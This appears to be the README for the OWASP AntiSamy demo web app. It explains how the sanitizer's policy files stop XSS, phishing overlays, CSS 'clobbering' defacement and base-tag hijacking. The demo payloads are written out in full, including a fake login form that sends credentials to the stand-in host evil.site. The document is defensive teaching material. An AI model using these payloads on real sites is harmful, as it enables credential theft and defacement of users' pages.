================================================================================
OWASP AntiSamy Web Demo

1. About the Demo
3. Building the Demo
4. Deploying the Demo
5. Running the Demo
================================================================================

================================================================================
1. About the Demo
================================================================================

This demo web application showcases the capabilities of the AntiSamy project,
including rich input validation and detailed, internationalized error messages.
It consists of a simple page that allows users to put rich HTML into a text area
for a mock blog entry or social networking site profile. For the purpose of the
demo, INSECURE AntiSamy policy files are used to allow for certain attacks to
be demonstrated.   
 
================================================================================
2. Building the Demo
================================================================================

An Ant target called "build-demo" is included in the AntiSamy build.xml. The
target builds the AntiSamyDemoWebApp WAR file that can be deployed on any Java
EE Web container.

================================================================================
3. Deploying the Demo
================================================================================

After building the AntiSamyDemoWebApp WAR file, place the WAR file in the
appropriate location for your application server.

In addition, the demo exploits described below depend on a few additional files.

The action for fake login form used in Demo 1 is directed to 
"http://evil.site/fake_login.html". The fake_login.html file is located in the
demo directory. This file should be copied to a location where it can be served
up for the demonstration. This can be in the same application server as
the AntiSamyDemoWebApp WAR or it can be a seperate server that is accessible
from the demonstration machine. The demo refers to the fictitious evil.site 
domain name. In order for the demo to work, you must either:
(1) configure your machine to map the domain name evil.site to the right server
OR (2) change the demo exploit text so that the action of the form refers to
the location where you have placed the fake_login.html file.
   
Similarly, demos 2 and 3 depend on a mangled footer image to be accessible. The
mangled footer image is the footer_aybabtu.jpg in the demo folder. This file
should be copied into an images directory and renamed as "footer.jpg" for the
demo exploits to work. This images directory can be on a separate server
instance or in a different context root than the AntiSamyDemoWebApp WAR. Again,
the demos refer to the fictitious evil.site domain name, in order for the demo 
to work, you must either:
(1) configure your machine to map the domain name evil.site to the right server
OR (2) change the demo exploit text so to refer to the proper location.  

================================================================================
4. Running the Demo
================================================================================

The URL for the web app varies based on the application server configuration, 
but most likely resembles:
http://localhost:8080/AntiSamyDemoWebApp/

Once the page is open, you will notice a large text area, two drop-down boxes,
and the "Update Profile" button. The large text area is where rich text can be
placed. The first drop-down box, Policy, selects the policy file to use. The
second drop-down box, Language, selects the language for error messags.

A typical demonstration runs as follows:

0) Explain that the default policy file for AntiSamy protects against all of the
exploits below. However, for demonstration purposes, parts of the policy file
have been removed to highlight the power, flexibility and features of AntiSamy.
 
1) Demonstrate how the application works by selecting NO POLICY. With this
option selected, AntiSamy does not validate the input. The demonstrator can
enter normal input to show how the application works. The demonstrator should
then show a basic XSS exploit to illustrate how the page is insecure: 
============BEGIN==============
<script>alert("XSS")</script>basic script attack<br>
=============END===============

2) After showing this demo exploit, change the Policy selection to 
antisamy-demo0.xml and explain that this policy file mirrors the HTML validation
in the real antisamy.xml. As such, the policy file prevents the previously
demonstrated XSS attack, as well as other HTML based XSS attacks. Attempt to
place the basic script attack from before to demonstrate that the attack is 
filtered out by AntiSamy. Also note the detailed error message that is
supplied. At any point during the demo, the demonstrator can also change the
Language selection to show the internationalized error messages.

3) Having demonstrated how AntiSamy can protect against XSS attacks, the 
remaining demos illustrate how AntiSamy goes beyond just XSS to protect against
other types of attacks against users. This next demo shows how AntiSamy can
protect against phishing. The following rich text creates what appears to be a
login form that is nested in a div element. The div element then uses CSS to
position itself overtop of the page, covering the entire contents and making
it appear as though the site is prompting for login credentials:
============BEGIN==============
<div style="position: absolute; left: 0px; top: 0px; 
width: 1900px; height: 1300px; 
z-index: 1000; background-color:white;
padding: 1em;">
Welcome to FaceSpace!!1! Please Login wit credentialz for major nigerian cash<br>
<form name="login" action="http://evil.site/fake_login.html" method="get">
<table><tr><td>Username:</td><td><input type="text" name="username"/></td></tr>
<tr><td>Password:</td><td><input type="password" name="password"/></td></tr>
<tr><td colspan=2 align=center><input type="submit" value="Login"/></td></tr>
</table>
</form>
</div>
=============END===============

After updating the profile with the above attack, notice the login form.
Enter an example username and password and click login, which sends this
information to the fake_login.html page and exposes the credentials for all to
see. Explain how such a technique could be use to conduct a phishing attack.
The solution to this problem, which is already implemented in the default
AntiSamy policy file, is to disallow the use of absolute positioning. This
simply requires the removal of the absolute, fixed and relative values for the
position property in the CSS rules. The antisamy-demo1.xml policy file makes
this change.

4) Change the policy file to antisamy-demo1.xml and show how the previous
attack no longer works. The next demonstration shows how CSS can be used to
deface a website. Explain how many websites now use div elements identified
by specific unique IDs. An attacker that identifies these IDs can create a
stylesheet that modifies the appearance of these elements using a technique
commonly referred to as "clobbering". In the demo app, the header bar is a
div element that uses the ID "header". The following exploit uses CSS to hide
the contents of the header div element and replaces it with a defacing
background image:
============BEGIN==============
<style>
div {
	
}
div#header * {
	display: none;
}
div#header {
background-image:url(http://evil.site/images/footer.jpg);
background-repeat:no-repeat;
width: 800px;
height:60px;
}
</style>
=============END===============

5) Explain how the solution for this is to list any IDs that the protected site
uses as part of the site layout and prevent users from creating stylesheets
that modify those ids. AntiSamy uses the cssIDExclusion directive to accomplish
this strategy. In this case, the cssIDExclusion directive becomes:
(#header|#menu|#profile|#footer)

AntiSamy validates that a CSS selector does not select on any ID from the above
expression. This strategy prevents an attacker from clobbering an ID that is
part of the site layout. Similar exclusion directives are available for
pseudo-selectors and attributes. The above cssIDExclusion is incorporated into
the antisamy-demo2.xml.

6) The final demonstration is another defacing demonstration utilizing the HTML
base tag. When referencing scripts, images and links, many sites use relative
references. In the demo site, the footer image source attribute is 
"images/footer.jpg". The base tag sets the base that is used to convert the
relative reference to an absolute reference. Using the following base tag,
the footer image no longer comes from the relative "images/footer.jpg" but 
instead from "http://evil.site/images/footer.jpg":
============BEGIN==============
<base href="http://evil.site">
=============END===============

This behavior results because the footer image tag is located after the 
content of the user-supplied profile. The effect of the base tag is to change 
the base of all relative image, script and link references after the declaration
of the base tag. Note that this demonstration does NOT work in Internet 
Explorer 7 as Microsoft changed the interpretation of the base tag so that it
is interpretted only if it is located in the HEAD tag (see 
http://blogs.msdn.com/ie/archive/2005/08/29/457667.aspx)

7) The solution is to remove the base tag from the whitelist of allowed HTML 
tags. The antisamy-demo3.xml file does this as well as maintains the previous
cssIDExclusion directive. Show how with this policy file, the attack no longer
works.

In general, any HTML element that is not desired can simply be removed from the
whitelist. That means if a site developer does not want users to be able to
add form elements, they merely have to remove HTML form tags from the policy
file. In this sense, AntiSamy is extermely robust and flexible. First and
foremost though, the default antisamy.xml policy file is meant to be safe out of
box. It's worth reminding the audience that the antisamy.xml policy file already
protects against all the attacks demonstrated here and more. 